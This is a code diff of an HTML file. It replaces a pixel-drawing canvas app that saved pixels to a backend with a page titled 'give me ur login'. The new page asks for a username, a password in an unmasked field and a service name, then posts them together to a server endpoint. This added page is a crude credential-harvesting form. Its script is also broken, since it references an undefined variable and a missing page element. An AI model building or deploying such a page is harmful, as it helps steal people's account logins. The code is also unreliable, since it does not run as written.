@@ -1,115 +1,49 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Pixel Canvas with Backend</title>
-  <style>
-    body {
-      background: #bfbfbf;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-    }
-    canvas {
-      border: 1px solid #333;
-      image-rendering: pixelated;
-      cursor: crosshair;
-    }
-  </style>
-</head>
-<body>
-  <canvas id="canvas" width="800" height="800"></canvas>
-
-  <script>
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-
-    const pixelSize = 20;
-    const cols = canvas.width / pixelSize;
-    const rows = canvas.height / pixelSize;
-
-    // Store pixel colors locally
-    const pixels = [];
-    for (let y = 0; y < rows; y++) {
-      pixels[y] = [];
-      for (let x = 0; x < cols; x++) {
-        pixels[y][x] = '#fff';
-      }
-    }
-
-    function draw() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      for (let y = 0; y < rows; y++) {
-        for (let x = 0; x < cols; x++) {
-          ctx.fillStyle = pixels[y][x];
-          ctx.fillRect(x * pixelSize, y * pixelSize, pixelSize, pixelSize);
-          ctx.strokeStyle = '#ccc';
-          ctx.strokeRect(x * pixelSize, y * pixelSize, pixelSize, pixelSize);
-        }
-      }
-    }
-
-    // Send pixel data to backend
-    async function sendPixel(x, y, color) {
-  try {
-    const res = await fetch('/api/pixels', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ x, y, color }),
-    });
-    if (!res.ok) console.error('Failed to save pixel');
-  } catch (e) {
-    console.error('Error saving pixel:', e);
-  }
-}
-
-
-    // Load all pixels from backend
-    async function loadPixels() {
-      try {
-        const res = await fetch('/api/pixels');
-        const data = await res.json();
-
-        // Reset all pixels white first
-        for (let y = 0; y < rows; y++) {
-          for (let x = 0; x < cols; x++) {
-            pixels[y][x] = '#fff';
-          }
-        }
-
-        // Set pixels from DB
-        data.forEach(({ x, y, color }) => {
-          if (y < rows && x < cols) {
-            pixels[y][x] = color;
-          }
-        });
-
-        draw();
-      } catch {
-        // fail silently
-      }
-    }
-
-    // On canvas click: toggle pixel color and send update
-    canvas.addEventListener('click', e => {
-      const rect = canvas.getBoundingClientRect();
-      const x = Math.floor((e.clientX - rect.left) / pixelSize);
-      const y = Math.floor((e.clientY - rect.top) / pixelSize);
-
-      if (pixels[y][x] === '#fff') {
-        pixels[y][x] = '#000';
-      } else {
-        pixels[y][x] = '#fff';
-      }
-
-      draw();
-      sendPixel(x, y, pixels[y][x]);
-    });
-
-    draw();
-    loadPixels();
-    setInterval(loadPixels, 4000); // reload every 4 seconds
-  </script>
-</body>
+    <head>
+        <title>give me ur login</title>
+        <style>
+            * {
+                font-family: monospace;
+            }
+            body {
+              background: #bfbfbf;
+            }
+        </style>
+    </head>
+    <body>
+        <form id="form">
+            <input type="text" id="username" placeholder="Username" />
+            <input type="text" id="password" placeholder="Password" />
+            <input type="text" id="trackingcode" placeholder="Service" />
+            <button type="submit">Send</button>
+        </form>
+        <script>
+            const form = document.getElementById('form');
+            
+            form.addEventListener('submit', async (e) => {
+              e.preventDefault();
+              const username = document.getElementById('username').value.trim();
+              const password = document.getElementById('password').value.trim();
+              const trackingcode = document.getElementById('trackingcode').value.trim();
+              if (!username || !password) {
+                alert('Please enter password AND username.');
+                return;
+              }
+            
+              try {
+                const res = await fetch('/api/server', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ content: `${username}, ${password}, Service: ${service}` })
+                });
+                document.getElementById("info").style.display = "block";
+                document.getElementById('username').value = '';
+                document.getElementById('password').value = '';
+              } catch (err) {
+                console.error('Error:', err);
+              }
+            });
+        </script>
+    </body>
 </html>
